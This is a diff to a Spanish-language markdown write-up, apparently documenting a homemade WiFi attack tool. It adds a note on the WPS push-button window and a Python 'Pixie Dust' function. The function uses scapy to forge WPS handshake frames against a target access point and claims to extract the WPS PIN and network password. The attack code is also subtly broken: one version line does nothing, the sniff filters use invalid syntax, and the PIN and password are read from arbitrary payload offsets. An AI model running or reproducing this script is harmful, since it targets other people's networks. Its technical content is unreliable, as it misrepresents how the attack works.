@@ -290,4 +290,113 @@ def simpleWPSconect(conected, target):
         print(colored("[!] Unable to connect to this network! ", 'red'))
 ```
 
+Esto intenta conectarse a una red WPS cuando se `aprieta el botón` en el AP. Dependiendo de la compañia que proporciona los servicios y como esta configurado el AP, una vez pulsado el botón tienes `60 o 120 segundos` para intentar conectarte sin la necesidad de proporcionar contraseña, por lo que esta parte `se repite` x veces hasta que supere el tiempo que has puesto y `cada 50 segundos se intenta conectar a la red`. También intenté poner un contador pero no lo conseguí.
+
+## PIXIE DUST
+
+```py
+def pixieDust(target, iface, SSID):
+    print(colored("[+] ", 'green'), "Trying Pixie Dust attack...")
+    try:
+        pin_int = "-1"
+        #### SEND M1 PACKAGE
+        ifconfig_result = subprocess.check_output(["ifconfig", iface])
+        src_mac = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(ifconfig_result)) # local mac
+
+        wps_info = wpa_supplicant.get_wps_info(iface) # package data
+        wps_version = re.search(r"Version:\s+(\d+)", wps_info).group(1)
+        wps_version1 = "WPSVersion=0x10"
+        if wps_version == "2":
+            "WPSVersion=0x20"
+            
+        cells = wifi.Cell.all(iface)
+        ap = cells.filter(lambda cell: cell.ssid == SSID)[0]
+        uuid = ap.uuid
+        
+        pixie_data = wps_version1 + \
+                    " MsgType=0x00" + \
+                    " UUID-E=" + uuid4().hex[:14] + \
+                    " UUID=" + str(uuid) + \
+                    " E-Hash1=" + hashlib.sha256(src_mac.encode()).hexdigest() + \
+                    " AuthKey=" + hashlib.sha256((uuid4().hex[:14] + hashlib.sha256(src_mac.encode()).hexdigest()).encode()).hexdigest()
+
+        print(colored("[+] ", 'green'), "Sending", colored("M1", 'yellow'), "package...")
+        m1_packet = scapy.RadioTap() / scapy.Dot11(type=0, subtype=4, addr1=target, addr2=src_mac, addr3=target) / scapy.Dot11Beacon(cap="ESS+privacy") / scapy.Dot11Elt(ID="SSID", info=SSID) / scapy.Dot11Elt(ID="vendor", info=pixie_data)
+        sendp(m1_packet, iface=iface, count=1, inter=0.1) # send M1 package from the iface
+
+        #### RECEIVE M2 PACKAGE
+        print(colored("[+] ", 'green'), "Reciving", colored("M2", 'yellow'), "package...")
+        filter = "ether src " + ap.address + " and dot11Mgt.type == 0 and dot11Mgt.subtype == 5 and dot11Mgt.info == 'P\x00\x00\x00\x00\x00\x00\x00\x00'"
+        m2_packet = sniff(iface=iface, filter=filter, count=1)[0] # capture M2 package
+        
+        #### SEND M3 PACKAGE
+        print(colored("[+] ", 'green'), "Sending", colored("M3", 'yellow'), "package...")
+        pixie_data = wps_version1 + \
+                    " MsgType=0x04" + \
+                    " Authenticator=" + hashlib.sha256((uuid4().hex[:14] + hashlib.sha256(src_mac.encode()).hexdigest()).encode()).hexdigest() + \
+                    " E-Hash2=" + hashlib.sha256(m2_packet[scapy.Dot11Elt][0].payload[37:41]).hexdigest()
+
+        # create M3 package
+        m3_packet = scapy.RadioTap() / scapy.Dot11(type=0, subtype=12, addr1=m2_packet.addr2, addr2=m2_packet.addr1, addr3=m2_packet.addr1) / scapy.Dot11Elt(ID="vendor", info=pixie_data)
+        sendp(m3_packet, iface=iface, count=1, inter=0.1) # send M3 package from the iface
+
+        #### RECEIVE M4 PACKAGE
+        print(colored("[+] ", 'green'), "Reciving", colored("M4", 'yellow'), "package...")
+        filter = "ether src " + ap.address + " and dot11Mgt.type == 0 and dot11Mgt.subtype == 5 and dot11Mgt.info == 'P\x00\x00\x00\x00\x00\x00\x00\x00'"
+        m4_packet = sniff(iface=iface, filter=filter, count=1)[0] # capture M4 package
+
+        pixie_data = m4_packet[scapy.Dot11Elt][0].payload
+        pin_hex = pixie_data[15:23] # extract PIN from payload
+        pin_int = int(pin_hex, 16) % 10000000 # convert PIN from hex to int
+
+        print(colored("[+]", 'green'), "PIN WPS found: " + colored(str(pin_int), 'cyan'))
+    
+        #### SEND M5 PACKAGE
+        print(colored("[+] ", 'green'), "Sending", colored("M5", 'yellow'), "package...")
+        pixie_data = wps_version1 + \
+                    " MsgType=0x06" + \
+                    " E-Hash1=" + hashlib.sha256(src_mac.encode()).hexdigest() + \
+                    " AuthKey=" + hashlib.sha256((uuid4().hex[:14] + hashlib.sha256(src_mac.encode()).hexdigest()).encode()).hexdigest() + \
+                    " WPS" + \
+                    " Response=" + m4_packet[scapy.Dot11Elt][0].payload[37:41] + \
+                    " STA=" + src_mac + \
+                    " AP=" + ap.address
+
+        # create M5 package
+        m5_packet = scapy.RadioTap() / scapy.Dot11(type=0, subtype=12, addr1=m2_packet.addr2, addr2=m2_packet.addr1, addr3=m2_packet.addr1) / scapy.Dot11Elt(ID="vendor", info=pixie_data)
+        sendp(m5_packet, iface=iface, count=1, inter=0.1) # send M5 package from the iface
+
+        #### RECEIVE M6 PACKAGE
+        print(colored("[+] ", 'green'), "Reciving", colored("M6", 'yellow'), "package...")
+        filter = "ether src " + ap.address + " and dot11Mgt.type == 0 and dot11Mgt.subtype == 5 and dot11Mgt.info == 'P\x00\x00\x00\x00\x00\x00\x00\x00'"
+        m6_packet = sniff(iface=iface, filter=filter, count=1)[0] # capture M6 package
+        
+        #### SEND M7 PACKAGE
+        print(colored("[+] ", 'green'), "Sending", colored("M7", 'yellow'), "package...")
+        pixie_data = wps_version1 + \
+                    " MsgType=0x08" + \
+                    " Authenticator=" + hashlib.sha256((uuid4().hex[:14] + hashlib.sha256(src_mac.encode()).hexdigest()).encode()).hexdigest() + \
+                    " E-Hash2=" + hashlib.sha256(m6_packet[scapy.Dot11Elt][0].payload[37:41]).hexdigest()
+
+        m7_packet = scapy.RadioTap() / scapy.Dot11(type=0, subtype=12, addr1=m2_packet.addr2, addr2=m2_packet.addr1, addr3=m2_packet.addr1) / scapy.Dot11Elt(ID="vendor", info=pixie_data)
+        sendp(m7_packet, iface=iface, count=1, inter=0.1) # send M7 package from the iface
+        
+        #### RECEIVE M8 PACKAGE
+        print(colored("[+] ", 'green'), "Receiving", colored("M8", 'yellow'), "package...")
+        filter = "ether src " + ap.address + " and dot11Mgt.type == 0 and dot11Mgt.subtype == 5 and dot11Mgt.info == 'P\x00\x00\x00\x00\x00\x00\x00\x00'"
+        m8_packet = sniff(iface=iface, filter=filter, count=1)[0] # capture M8 package
+
+        pixie_data = m8_packet[scapy.Dot11Elt][0].payload
+        pwd_hex = pixie_data[15:47] # extract password from payload
+        password = binascii.unhexlify(pwd_hex).decode() # convert hex password to ascii string
+
+        print(colored("[+]", 'green'), "Password WPS found: " + colored(str(password), 'cyan'))
+        return str(password)
+
+    except:
+        return("-1")
+```
+
+
+
 
